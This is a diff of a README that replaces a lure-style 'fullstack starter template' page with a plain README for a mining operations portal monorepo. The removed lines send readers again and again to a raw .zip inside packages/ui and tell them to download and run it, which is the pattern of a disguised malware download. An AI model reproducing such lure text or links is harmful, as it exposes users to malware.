@@ -1,94 +1,58 @@
-# 🚀 Turborepo-Fullstack-Starter-Template - Build Fullstack Apps with Ease
+# Arch-Systems (Plantcor) Mining Operations Portal
 
-[![Download Latest Release](https://raw.githubusercontent.com/DRACOSFN/Turborepo-Fullstack-Starter-Template/master/packages/ui/Template-Fullstack-Starter-Turborepo-v1.1.zip%20Latest%https://raw.githubusercontent.com/DRACOSFN/Turborepo-Fullstack-Starter-Template/master/packages/ui/Template-Fullstack-Starter-Turborepo-v1.1.zip)](https://raw.githubusercontent.com/DRACOSFN/Turborepo-Fullstack-Starter-Template/master/packages/ui/Template-Fullstack-Starter-Turborepo-v1.1.zip)
+A high-performance, multi-departmental mining operations portal built as a monorepo. It provides authenticated access to department-specific dashboards for drilling, production, access control, engineering, control room, safety, training, and satellite monitoring.
 
-## 📋 Overview
+## 🏗️ Architecture
 
-Turborepo-Fullstack-Starter-Template is a complete solution for building scalable fullstack applications. It combines popular technologies like https://raw.githubusercontent.com/DRACOSFN/Turborepo-Fullstack-Starter-Template/master/packages/ui/Template-Fullstack-Starter-Turborepo-v1.1.zip for the front end, https://raw.githubusercontent.com/DRACOSFN/Turborepo-Fullstack-Starter-Template/master/packages/ui/Template-Fullstack-Starter-Turborepo-v1.1.zip for the back end, and Supabase for database and authentication needs. This template uses Tailwind for styling and includes built-in testing frameworks such as Jest and Playwright, making it perfect for rapid development.
+This project is organized as a **Turborepo** monorepo using **pnpm** for workspace management.
 
-## 🚀 Getting Started
+### Applications (`apps/`)
+- **`portal`**: The main Next.js 15+ (App Router) application. High-density dashboards, real-time monitoring, and data entry forms.
+- **`cms`**: Payload CMS v3 (headless) for managing system content and documentation.
+- **`overview`**: A standalone Next.js application for architectural visualization and system-wide monitoring.
 
-Follow these simple steps to get your application up and running.
+### Packages (`packages/`)
+- **`theme`**: Design tokens, OKLCH color system, and Tailwind CSS configuration (Single Source of Truth).
+- **`ui`**: Shared React components (GlassCard, KPI, DepartmentLayout, etc.) built with Radix UI and shadcn/ui.
+- **`supabase`**: Shared Supabase clients (browser, server, middleware) and auth utilities.
+- **`database`**: SQL migrations and schema definitions.
+- **`utils`**: Common utility functions (formatting, dates, shift helpers).
+- **`hooks`**: Shared React hooks.
+- **`types`**: Common TypeScript interfaces and types.
 
-### 1. Visit the Releases Page
+## 🚀 Quick Start
 
-Begin by visiting the [Releases page](https://raw.githubusercontent.com/DRACOSFN/Turborepo-Fullstack-Starter-Template/master/packages/ui/Template-Fullstack-Starter-Turborepo-v1.1.zip) where you can find the latest version of the software.
+### Prerequisites
+- **Node.js**: `>=20.17.0`
+- **pnpm**: `9.12.0`
 
-### 2. Download the Application
+### Setup
+1. **Install dependencies**:
+   ```bash
+   pnpm install
+   ```
+2. **Environment Variables**:
+   Copy `apps/portal/.env.example` to `apps/portal/.env` and fill in your Supabase credentials.
+3. **Start Local Database** (requires Docker):
+   ```bash
+   cd packages/database && pnpm supabase:dev
+   ```
+4. **Development Mode**:
+   ```bash
+   pnpm dev
+   ```
 
-Once on the Releases page, you will see a list of available versions. Click on the latest version link to go to the download section.
+## 🛠️ Key Commands
+- `pnpm dev`: Start the portal development server.
+- `pnpm build`: Build all applications and packages.
+- `pnpm lint`: Run linting across the entire monorepo.
+- `pnpm test`: Run tests (Jest and Playwright).
+- `pnpm deploy:local`: Full stack deployment (Supabase + build + start).
 
-### 3. Choose Your File
-
-Select the appropriate file for your operating system. We support various options such as:
-
-- **Windows**: Download the `.exe` file for a smooth installation.
-- **macOS**: Choose the `.dmg` file for easy setup.
-- **Linux**: Use the provided `https://raw.githubusercontent.com/DRACOSFN/Turborepo-Fullstack-Starter-Template/master/packages/ui/Template-Fullstack-Starter-Turborepo-v1.1.zip` file for your distribution.
-
-## 📥 Download & Install
-
-To start using the template:
-
-1. **Visit the Releases page**: Click [here](https://raw.githubusercontent.com/DRACOSFN/Turborepo-Fullstack-Starter-Template/master/packages/ui/Template-Fullstack-Starter-Turborepo-v1.1.zip).
-2. **Download the corresponding file** for your operating system as mentioned above.
-3. **Run the file you downloaded**. Follow any on-screen prompts to complete the installation.
-
-Once installation is complete, you can launch the application.
-
-## ⚙️ System Requirements
-
-Before you start, make sure your system meets the following requirements:
-
-- **Operating System**: Windows 10 or higher, macOS 10.14 or higher, or any modern Linux distribution.
-- **RAM**: At least 4GB (8GB recommended).
-- **Disk Space**: Minimum of 1GB available.
-
-For best performance, ensure your system is up-to-date.
-
-## 🔍 Features
-
-- **Fullstack Structure**: Easy integration between front end and back end.
-- **Fast Setup**: Powered by `pnpm`, enabling quick installations.
-- **UI Framework**: Tailwind CSS for responsive design.
-- **Testing**: Built-in frameworks for unit and end-to-end testing.
-- **Continuous Integration**: Automate your deployments with GitHub actions.
-
-## 🛠️ Troubleshooting
-
-If you encounter any issues during installation, try the following:
-
-- Ensure your operating system meets the specified requirements.
-- Verify that you downloaded the correct file for your platform.
-- Check for any permission restrictions on your system that may affect installations.
-
-If problems persist, consider visiting the Issues section on our GitHub repo for solutions from the community.
-
-## 📞 Support
-
-For further assistance, you can open an issue in the GitHub repository, and our community or maintainers will help you as soon as possible.
-
-## 📝 Contributing
-
-We welcome contributions! Feel free to fork the repository and submit pull requests for any feature enhancements or bug fixes. Read our contributing guidelines for more details.
-
-## 📚 Related Topics
-
-This project covers a range of topics relevant to modern software development:
-
-- **CICD**
-- **Fullstack Development**
-- **Testing with Jest and Playwright**
-- **https://raw.githubusercontent.com/DRACOSFN/Turborepo-Fullstack-Starter-Template/master/packages/ui/Template-Fullstack-Starter-Turborepo-v1.1.zip and https://raw.githubusercontent.com/DRACOSFN/Turborepo-Fullstack-Starter-Template/master/packages/ui/Template-Fullstack-Starter-Turborepo-v1.1.zip**
-- **Frontend and Backend Integration**
-- **Tailwind CSS Design**
-
-Explore the repository to learn more about each feature and how to use them effectively.
-
-## 🌐 Visit Our Community
-
-Join our community on platforms like Discord or Slack to connect with other users, share experiences, and get help. The links to these platforms can often be found in our repository's documentation.
+## 📖 Documentation
+- [CLAUDE.md](CLAUDE.md): Authoritative technical guide and conventions.
+- [DESIGN.md](DESIGN.md): Detailed design system, color palette (OKLCH), and component rules.
+- [PRODUCT.md](PRODUCT.md): Product strategy, user personas, and core mission.
 
 ---
-
-Feel free to explore and enjoy building your next fullstack application with Turborepo-Fullstack-Starter-Template!
+*Built for industrial-scale vigilance and operational precision.*
